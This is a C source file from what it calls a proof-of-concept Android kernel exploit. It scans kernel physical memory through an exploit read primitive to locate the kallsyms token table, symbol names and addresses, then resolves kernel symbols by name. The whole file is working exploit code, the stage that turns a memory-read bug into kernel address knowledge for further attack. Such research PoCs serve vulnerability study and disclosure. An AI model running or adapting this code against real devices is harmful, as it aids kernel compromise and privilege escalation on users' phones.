// Note that the technique used here to find kallsyms is pretty crude. It does
// work on the devices I tried (mostly Pixels), but I have no idea how well
// this does against other devices.
// My intention here wasn't to build a full robust kallsyms finder, but rather
// a quick and simple PoC for the exploit.

#include <stdio.h>
#include <string.h>
#include <inttypes.h>
#include <stdint.h>

#include "defs.h"
#include "exploit.h"
#include "kallsyms.h"

// Small chunk to read each time when performing that first search
#define SMALL_READ_SIZE (0x00020000)
// I'm not entirely sure why, but for some reason using the full exploit buffer
// can sometimes fail
#define READ_BUFFER_SIZE (EXPLOIT_BUFFER_SIZE - 0x1000)
// Every kallsyms symbol should be aligned to this
#define KALLSYMS_ALIGN (0x100)
#define KALLSYMS_TOKENS_NUM (0x100)
#define SEARCH_SIZE (0x02000000)
// Maximum size a kallsyms name can have
#define KSYM_NAME_LEN (128)

// The buffer we read all the data into
static uint8_t g_read_buf[READ_BUFFER_SIZE] = {0};

// All the kallsyms goodies
// The pointers should eventually point to inside g_read_buf
static uint64_t g_kallsyms_num_syms;
static uint64_t g_kallsyms_relative_base = 0;
static void *g_kallsyms_addresses;
static char *g_kallsyms_names;
static char *g_kallsyms_token_table;
static uint16_t *g_kallsyms_token_index;

// Scan the kernel memory looking for a specific marker that should indicate
// where the kallsyms_token_table is
static physaddr_t find_kallsyms_token_table(void)
{
    // Loosely based on
    // https://github.com/marin-m/vmlinux-to-elf/blob/92925eebfc85de40deb506ec2227e22abd9b7d6f/vmlinux_to_elf/kallsyms_finder.py#L386
    const char token_table_marker[] = {'7', 0, '8', 0, '9', 0};
    physaddr_t marker_addr = 0;

    // Read in small chunks so we don't accidentally try to read something we
    // can't read
    // This does leave open the possibility of our token table marker being
    // exactly between two chunks, but that's very unlikely
    for (physaddr_t addr = KERNEL_PHYS_BASE;
         addr < KERNEL_PHYS_BASE + SEARCH_SIZE;
         addr += SMALL_READ_SIZE)
    {
        if (0 == exploit_phys_read(g_read_buf, addr, SMALL_READ_SIZE)) {
            return 0;
        }

        uint8_t *pos = g_read_buf;
        do {
            pos = (uint8_t *)memmem(pos, SMALL_READ_SIZE - (pos - g_read_buf),
                                    token_table_marker,
                                    sizeof(token_table_marker));
            if (NULL == pos) {
                break;
            }
            pos += sizeof(token_table_marker);
            // If the bytes after the marker are one of those then this isn't
            // actually the token table
        } while (0x3a == *pos || 0 == *pos);

        if (NULL != pos) {
            marker_addr = addr + (pos - g_read_buf);
            break;
        }
    }

    if (0 == marker_addr) {
        fprintf(stderr, "[-] Failed to find kallsyms_token_table marker\n");
        return 0;
    }

    fprintf(stderr, "[+] Found kallsyms_token_table marker\n");

    // Just to make sure no data got chunked out, read again from this point
    // backwards, aligned
    physaddr_t read_start = (marker_addr - (marker_addr % KALLSYMS_ALIGN)) -
                            SMALL_READ_SIZE;
    if (0 == exploit_phys_read(g_read_buf, read_start, SMALL_READ_SIZE)) {
        return 0;
    }
    // Now scan backwards looking for where the token table starts
    // Just before the token table there should be 4 zero bytes
    for (uint8_t *pos = g_read_buf + SMALL_READ_SIZE;
         pos - KALLSYMS_ALIGN > g_read_buf;
         pos -= KALLSYMS_ALIGN)
    {
        if (0 == *(uint32_t *)(pos - 4)) {
            return read_start + (pos - g_read_buf);
        }
    }

    fprintf(stderr, "[-] Failed to find kallsyms_token_table start\n");
    return 0;
}

int kallsyms_find(void)
{
    physaddr_t token_table = find_kallsyms_token_table();
    if (0 == token_table) {
        return 0;
    }

    // Now that we know we're not gonna hit any memory we can't read, we can
    // read everything in one big chunk
    // We want to mostly read data before the token table, but still leave room
    // of SMALL_READ_SIZE for the token index
    physaddr_t addr_diff = sizeof(g_read_buf) - SMALL_READ_SIZE;
    physaddr_t read_addr = token_table - addr_diff;
    if (0 == exploit_phys_read(g_read_buf, read_addr, sizeof(g_read_buf))) {
        return 0;
    }
    g_kallsyms_token_table = (char *)(g_read_buf + addr_diff);

    // Read backwards until we reach a kernel pointer, which would indicate
    // we've reached either kallsyms_addresses or kallsyms_relative_base
    // The indicator we use for kernel pointers is that they all should begin
    // with 0xffffff
    uint8_t *pos = g_read_buf + sizeof(g_read_buf);
    for (; 0xffffff != *(uint64_t *)pos >> 40; pos -= KALLSYMS_ALIGN) {
        if (pos < g_read_buf) {
            fprintf(stderr,
                    "[-] Failed to find a kernel pointer in kallsyms\n");
            return 0;
        }
    }
    // Straight after, there should be kallsyms_num_syms and kallsyms_names
    g_kallsyms_num_syms = *(uint64_t *)(pos + KALLSYMS_ALIGN);
    g_kallsyms_names = (char *)(pos + (KALLSYMS_ALIGN * 2));

    // If there isn't another pointer straight behind, then the addresses
    // are relative
    if (*(uint64_t *)(pos - 8) >> 40 != 0xffffff) {
        g_kallsyms_relative_base = *(uint64_t *)pos;
    }

    // Find the first kallsyms address: _head
    for (; ; pos -= KALLSYMS_ALIGN) {
        if (pos < g_read_buf) {
            fprintf(stderr,
                    "[-] Failed to find start of kallsyms_addresses\n");
            return 0;
        }
        uint64_t *addr = (uint64_t *)pos;

        if (0 != g_kallsyms_relative_base) {
            // For relative addresses, simply find 0
            if (0 == *addr) {
                break;
            }
        } else {
            // For non-relative addresses, _head should have the same value as
            // the next address (_text), and it's supposed to point to a
            // beginning of a page, so its last 3 nibbles should be 0
            if (addr[0] == addr[1] && 0 == (addr[0] & 0xfff)) {
                break;
            }
        }
    }
    g_kallsyms_addresses = (uint64_t *)pos;

    // Now to find the token index, read KALLSYMS_TOKENS_NUM strings from the
    // token table, the token index should be after it
    pos = (uint8_t *)g_kallsyms_token_table;
    for (size_t i = 0; i < KALLSYMS_TOKENS_NUM; i++) {
        pos += strlen((char *)pos) + 1;
    }
    pos += KALLSYMS_ALIGN - ((pos - g_read_buf) % KALLSYMS_ALIGN);
    g_kallsyms_token_index = (uint16_t *)pos;

    return 1;
}

uint64_t kallsyms_lookup_name(const char *name)
{
    char name_buf[KSYM_NAME_LEN];

    // Go over each name to see if it's the one we want
    uint8_t *pos = (uint8_t *)g_kallsyms_names;
    for (uint64_t i = 0; i < g_kallsyms_num_syms; i++) {
        // Expand the name using the token table
        memset(name_buf, 0, sizeof(name_buf));
        uint8_t *end = pos + *pos + 1;
        pos++;
        for (; pos < end; pos++) {
            strcat(name_buf,
                   g_kallsyms_token_table + g_kallsyms_token_index[*pos]);
        }
        // Check if the expanded name is what we're looking for
        if (strcmp(name_buf + 1, name) == 0) {
            if (0 != g_kallsyms_relative_base) {
                return ((uint32_t *)g_kallsyms_addresses)[i] +
                       g_kallsyms_relative_base;
            } else {
                return ((uint64_t *)g_kallsyms_addresses)[i];
            }
        }
    }

    fprintf(stderr, "[-] Failed to find kallsyms symbol: %s\n", name);
    return 0;
}
